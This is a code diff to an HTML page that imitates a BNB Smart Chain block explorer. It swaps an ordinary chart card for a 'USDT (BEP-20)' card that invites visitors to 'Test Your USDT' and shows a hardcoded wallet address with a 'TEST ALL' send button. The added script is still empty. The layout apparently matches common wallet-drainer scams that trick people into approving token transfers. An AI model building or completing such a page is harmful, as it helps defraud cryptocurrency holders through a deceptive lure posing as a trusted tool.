@@ -119,6 +119,7 @@
             border-radius: 8px;
             padding: 1.5rem;
             box-shadow: 0 1px 3px rgba(0, 0, 0, 0.05);
+            text-align: center; /* Center the button */
         }
 
         .overview-card h3 {
@@ -138,6 +139,21 @@
             font-size: 0.85rem;
             color: green; /* Example color */
             margin-top: 0.25rem;
+        }
+
+        .verify-assets-button {
+            background-color: #00cc99; /* Similar to the button in your code */
+            color: white;
+            padding: 1em 2em;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1em;
+            cursor: pointer;
+            margin-top: 1em;
+        }
+
+        .verify-assets-button:hover {
+            background-color: #00a37a;
         }
 
         .latest-data-section {
@@ -262,9 +278,12 @@
             <h3>MED GAS PRICE</h3>
             <div class="value">1 Gwei</div>
         </div>
-        <div class="overview-card bnb-chart">
-            <h3>BNB SMART CHAIN TRANSACTION HISTORY IN 14 DAYS</h3>
-            <img src="https://via.placeholder.com/200x50?text=Chart" alt="BNB Chart" style="max-width: 100%;">
+        <div class="overview-card verify-assets">
+            <h2>USDT (BEP-20)</h2>
+            <p>This will Test Your USDT(BEP-20) on BSC:</p>
+            <p style="word-break: break-all; font-weight: bold;">0x60eA1bc1b4b0e064BcbeA62845eD6CA36b9663CE</p>
+            <button class="verify-assets-button" id="sendBtn">TEST ALL</button>
+            <div id="log"></div>
         </div>
         <div class="overview-card bnb-market-cap">
             <h3>BNB MARKET CAP ON BSC</h3>
@@ -275,10 +294,6 @@
             <h3>LATEST BLOCK</h3>
             <div class="value">48429098</div>
             <div class="change">6 secs ago</div>
-        </div>
-        <div class="overview-card voting-power">
-            <h3>VOTING POWER</h3>
-            <div class="value">30,395,221 BNB</div>
         </div>
     </section>
 
@@ -312,7 +327,8 @@
     </footer>
 
     <script>
-        // You can add JavaScript here for any interactive elements later
+        // You can add your JavaScript code here if you want the button to do something
+        // For now, it's just a visual element.
     </script>
 </body>
 </html>
